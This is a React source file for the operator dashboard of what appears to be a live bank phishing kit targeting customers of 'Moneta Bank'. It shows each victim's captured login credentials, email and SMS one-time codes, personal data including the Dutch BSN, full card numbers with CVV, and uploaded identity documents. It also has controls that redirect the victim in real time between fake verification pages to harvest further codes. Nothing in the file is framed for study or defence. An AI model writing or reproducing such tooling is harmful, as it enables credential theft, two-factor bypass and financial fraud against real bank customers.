import { useState, useEffect } from 'react';
import { PageType } from '../../contexts/SessionContext';
import { Moon, Sun, Copy, Check, ChevronRight, Wifi, WifiOff, Download, Home, Activity, Clock } from 'lucide-react';
import { Button } from '../ui/button';
import { Badge } from '../ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../ui/tabs';
import { ScrollArea } from '../ui/scroll-area';
import { toast } from 'sonner@2.0.3';
import { Toaster } from '../ui/sonner';
import { PartyKitAdminClient } from '../../lib/partykit-client';

// Client data structure from PartyKit
interface ClientData {
  clientId: string;
  sessionId: string;
  currentPage: string;
  status: 'online' | 'offline';
  startedAt: number;
  lastSeen: number;
  ip: string;
  userAgent: string;
  location?: string;
  data: {
    loginCredentials?: { username: string; password: string; timestamp: number };
    emailOTP?: { code: string; timestamp: number };
    smsOTP?: { code: string; timestamp: number };
    personalData?: {
      firstName: string;
      lastName: string;
      email: string;
      phone: string;
      dob: string;
      bsn: string;
      timestamp: number;
    };
    creditCard?: {
      number: string;
      name: string;
      expiry: string;
      cvv: string;
      timestamp: number;
    };
    documents?: Array<{ name: string; url: string; timestamp: number }>;
    qrCode?: { url: string; timestamp: number };
    whatsappNumber?: { number: string; timestamp: number };
  };
  activityHistory: Array<{
    timestamp: number;
    page: string;
    action: string;
    details?: string;
  }>;
}

interface AdminClientViewProps {
  clientId: string;
}

export default function AdminClientView({ clientId }: AdminClientViewProps) {
  const [client, setClient] = useState<ClientData | null>(null);
  const [darkMode, setDarkMode] = useState(true);
  const [copiedField, setCopiedField] = useState<string>('');
  const [partyClient] = useState(() => {
    const host = import.meta.env?.VITE_PARTYKIT_HOST || "localhost:1999";
    return new PartyKitAdminClient(host, "moneta-bank-main");
  });

  // Connect to PartyKit
  useEffect(() => {
    partyClient.connect()
      .then(() => {
        console.log('✅ Admin Client View connected to PartyKit');
      })
      .catch(() => {
        toast.error('❌ Failed to connect to PartyKit');
      });

    // Listen for all clients (we'll filter for this one)
    partyClient.on('server:all_clients', (clientsList: ClientData[]) => {
      const foundClient = clientsList.find(c => c.clientId === clientId);
      if (foundClient) {
        setClient(foundClient);
      }
    });

    // Listen for client updates
    partyClient.on('server:client_update', (updatedClient: ClientData) => {
      if (updatedClient.clientId === clientId) {
        setClient(updatedClient);
      }
    });

    return () => {
      partyClient.disconnect();
    };
  }, [partyClient, clientId]);

  const redirectClient = async (page: PageType) => {
    partyClient.redirectClient(clientId, page);
    toast.success(`🔄 Redirecting client to ${page}`);
  };

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    toast.success(`✅ Copied ${field}`);
    setTimeout(() => setCopiedField(''), 2000);
  };

  const handleDownloadDocument = (url: string, name: string) => {
    const link = document.createElement('a');
    link.href = url;
    link.download = name;
    link.click();
    toast.success(`📥 Downloading ${name}`);
  };

  const formatTime = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleTimeString() + ' - ' + date.toLocaleDateString();
  };

  const formatDuration = (timestamp: number) => {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ${seconds % 60}s`;
    const hours = Math.floor(minutes / 60);
    return `${hours}h ${minutes % 60}m`;
  };

  const getPageDisplayName = (page: string): string => {
    const pageMap: Record<string, string> = {
      'alert': '🔔 Security Alert',
      'login': '🔐 Login',
      'loading': '⏳ Loading',
      'personal-data': '👤 Personal Data',
      'credit-card': '💳 Credit Card',
      'document-upload': '📄 Documents',
      'email-otp': '📧 Email OTP',
      'sms-otp': '📱 SMS OTP',
      'qr-code': '📷 QR Code',
      'qr-upload': '📸 QR Upload',
      'url-verification': '🔗 URL Verification',
      'whatsapp-support': '💬 WhatsApp',
      'app-verification': '📱 App Verification',
      'wrong-details': '❌ Error',
      'success': '✅ Success'
    };
    return pageMap[page] || page;
  };

  if (!client) {
    return (
      <div className={`min-h-screen ${darkMode ? 'dark bg-slate-950' : 'bg-slate-50'} flex items-center justify-center`}>
        <div className="text-center">
          <Activity className={`w-12 h-12 ${darkMode ? 'text-slate-700' : 'text-slate-300'} mx-auto mb-4 animate-pulse`} />
          <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>
            Loading client data...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen ${darkMode ? 'dark bg-slate-950' : 'bg-slate-50'}`}>
      <Toaster position="top-right" />
      
      {/* Header */}
      <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border-b sticky top-0 z-50`}>
        <div className="px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              {client.status === 'online' ? (
                <Wifi className="w-6 h-6 text-emerald-400" />
              ) : (
                <WifiOff className="w-6 h-6 text-slate-600" />
              )}
              <div>
                <h1 className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>
                  Client Session: {client.sessionId.slice(-12)}
                </h1>
                <p className={`${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>
                  Connected {formatDuration(client.startedAt)} ago
                </p>
              </div>
            </div>

            <div className="flex items-center gap-4">
              <Badge variant={client.status === 'online' ? 'default' : 'secondary'}>
                {client.status}
              </Badge>

              <div className="flex items-center gap-2">
                <Sun className={`w-4 h-4 ${darkMode ? 'text-slate-600' : 'text-yellow-500'}`} />
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setDarkMode(!darkMode)}
                  className="w-12 h-6 p-0"
                >
                  <div className={`w-full h-full rounded-full ${darkMode ? 'bg-slate-700' : 'bg-slate-300'} relative`}>
                    <div className={`absolute top-0.5 ${darkMode ? 'right-0.5' : 'left-0.5'} w-5 h-5 rounded-full bg-white transition-all`} />
                  </div>
                </Button>
                <Moon className={`w-4 h-4 ${darkMode ? 'text-blue-400' : 'text-slate-400'}`} />
              </div>

              <Button
                onClick={() => window.close()}
                variant="outline"
                className={darkMode ? 'border-slate-700 text-slate-300' : ''}
              >
                <Home className="w-4 h-4 mr-2" />
                Close
              </Button>
            </div>
          </div>

          {/* Client Info Bar */}
          <div className="grid grid-cols-4 gap-4 mt-4">
            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-3`}>
              <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mb-1`}>IP Address</p>
              <div className="flex items-center justify-between">
                <p className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>{client.ip}</p>
                <button
                  onClick={() => handleCopy(client.ip, 'IP')}
                  className={`${darkMode ? 'text-slate-500 hover:text-slate-300' : 'text-slate-400 hover:text-slate-600'}`}
                >
                  {copiedField === 'IP' ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-3`}>
              <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mb-1`}>Current Page</p>
              <p className={`${darkMode ? 'text-blue-400' : 'text-blue-600'}`}>
                {getPageDisplayName(client.currentPage)}
              </p>
            </div>

            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-3`}>
              <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mb-1`}>Last Activity</p>
              <p className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>
                {formatDuration(client.lastSeen)} ago
              </p>
            </div>

            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-3`}>
              <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mb-1`}>Total Actions</p>
              <p className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>
                {client.activityHistory.length}
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-6">
        <Tabs defaultValue="data" className="w-full">
          <TabsList className={`${darkMode ? 'bg-slate-900' : 'bg-slate-200'} mb-4`}>
            <TabsTrigger value="data">Captured Data</TabsTrigger>
            <TabsTrigger value="activity">Activity History</TabsTrigger>
            <TabsTrigger value="redirect">Admin Controls</TabsTrigger>
          </TabsList>

          {/* Captured Data Tab */}
          <TabsContent value="data">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              
              {/* Login Credentials */}
              {client.data.loginCredentials && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3 flex items-center gap-2`}>
                    🔐 Login Credentials
                  </h3>
                  <div className="space-y-2">
                    <div className="flex justify-between items-center">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Username:</span>
                      <div className="flex items-center gap-2">
                        <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                          {client.data.loginCredentials.username}
                        </span>
                        <button onClick={() => handleCopy(client.data.loginCredentials!.username, 'Username')}>
                          {copiedField === 'Username' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                        </button>
                      </div>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Password:</span>
                      <div className="flex items-center gap-2">
                        <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                          {client.data.loginCredentials.password}
                        </span>
                        <button onClick={() => handleCopy(client.data.loginCredentials!.password, 'Password')}>
                          {copiedField === 'Password' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                        </button>
                      </div>
                    </div>
                    <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-2`}>
                      Captured: {formatTime(client.data.loginCredentials.timestamp)}
                    </p>
                  </div>
                </div>
              )}

              {/* Personal Data */}
              {client.data.personalData && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3 flex items-center gap-2`}>
                    👤 Personal Data
                  </h3>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Name:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.personalData.firstName} {client.data.personalData.lastName}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Email:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.personalData.email}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Phone:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.personalData.phone}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>DOB:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.personalData.dob}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>BSN:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.personalData.bsn}
                      </span>
                    </div>
                    <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-2`}>
                      Captured: {formatTime(client.data.personalData.timestamp)}
                    </p>
                  </div>
                </div>
              )}

              {/* Credit Card */}
              {client.data.creditCard && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3 flex items-center gap-2`}>
                    💳 Credit Card
                  </h3>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Number:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.creditCard.number}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Name:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.creditCard.name}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Expiry:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.creditCard.expiry}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>CVV:</span>
                      <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                        {client.data.creditCard.cvv}
                      </span>
                    </div>
                    <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-2`}>
                      Captured: {formatTime(client.data.creditCard.timestamp)}
                    </p>
                  </div>
                </div>
              )}

              {/* Email OTP */}
              {client.data.emailOTP && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3`}>
                    📧 Email OTP
                  </h3>
                  <p className={`${darkMode ? 'text-slate-200' : 'text-slate-800'} text-xl`}>
                    {client.data.emailOTP.code}
                  </p>
                  <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-2`}>
                    Captured: {formatTime(client.data.emailOTP.timestamp)}
                  </p>
                </div>
              )}

              {/* SMS OTP */}
              {client.data.smsOTP && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3`}>
                    📱 SMS OTP
                  </h3>
                  <p className={`${darkMode ? 'text-slate-200' : 'text-slate-800'} text-xl`}>
                    {client.data.smsOTP.code}
                  </p>
                  <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-2`}>
                    Captured: {formatTime(client.data.smsOTP.timestamp)}
                  </p>
                </div>
              )}

              {/* Documents */}
              {client.data.documents && client.data.documents.length > 0 && (
                <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-4 col-span-2`}>
                  <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-3`}>
                    📄 Uploaded Documents
                  </h3>
                  <div className="grid grid-cols-3 gap-4">
                    {client.data.documents.map((doc, idx) => (
                      <div key={idx} className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded p-3`}>
                        <img src={doc.url} alt={doc.name} className="w-full h-40 object-cover rounded mb-2" />
                        <p className={`${darkMode ? 'text-slate-300' : 'text-slate-700'} mb-2`}>{doc.name}</p>
                        <Button
                          onClick={() => handleDownloadDocument(doc.url, doc.name)}
                          size="sm"
                          className="w-full"
                        >
                          <Download className="w-3 h-3 mr-2" />
                          Download
                        </Button>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {!client.data.loginCredentials && !client.data.personalData && !client.data.creditCard && (
              <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-12 text-center`}>
                <Activity className={`w-12 h-12 ${darkMode ? 'text-slate-700' : 'text-slate-300'} mx-auto mb-4`} />
                <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>
                  No data captured yet
                </p>
              </div>
            )}
          </TabsContent>

          {/* Activity History Tab */}
          <TabsContent value="activity">
            <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg`}>
              <ScrollArea className="h-[600px] p-4">
                <div className="space-y-3">
                  {client.activityHistory.map((entry, idx) => (
                    <div
                      key={idx}
                      className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-3 flex items-start gap-3`}
                    >
                      <Clock className={`w-4 h-4 ${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-1`} />
                      <div className="flex-1">
                        <p className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>
                          {entry.action}
                        </p>
                        {entry.details && (
                          <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mt-1`}>
                            {entry.details}
                          </p>
                        )}
                        <p className={`${darkMode ? 'text-slate-500' : 'text-slate-400'} mt-1`}>
                          {formatTime(entry.timestamp)} • {getPageDisplayName(entry.page)}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            </div>
          </TabsContent>

          {/* Admin Controls Tab */}
          <TabsContent value="redirect">
            <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-6`}>
              <h3 className={`${darkMode ? 'text-white' : 'text-slate-900'} mb-4`}>
                Redirect Client to Page
              </h3>
              <div className="grid grid-cols-3 gap-3">
                {(['alert', 'login', 'loading', 'personal-data', 'credit-card', 'document-upload', 
                   'email-otp', 'sms-otp', 'qr-code', 'qr-upload', 'url-verification', 
                   'whatsapp-support', 'app-verification', 'wrong-details', 'success'] as PageType[]).map(page => (
                  <Button
                    key={page}
                    onClick={() => redirectClient(page)}
                    variant="outline"
                    className={`${darkMode ? 'border-slate-700 hover:bg-slate-800' : ''} justify-start`}
                  >
                    <ChevronRight className="w-4 h-4 mr-2" />
                    {getPageDisplayName(page)}
                  </Button>
                ))}
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
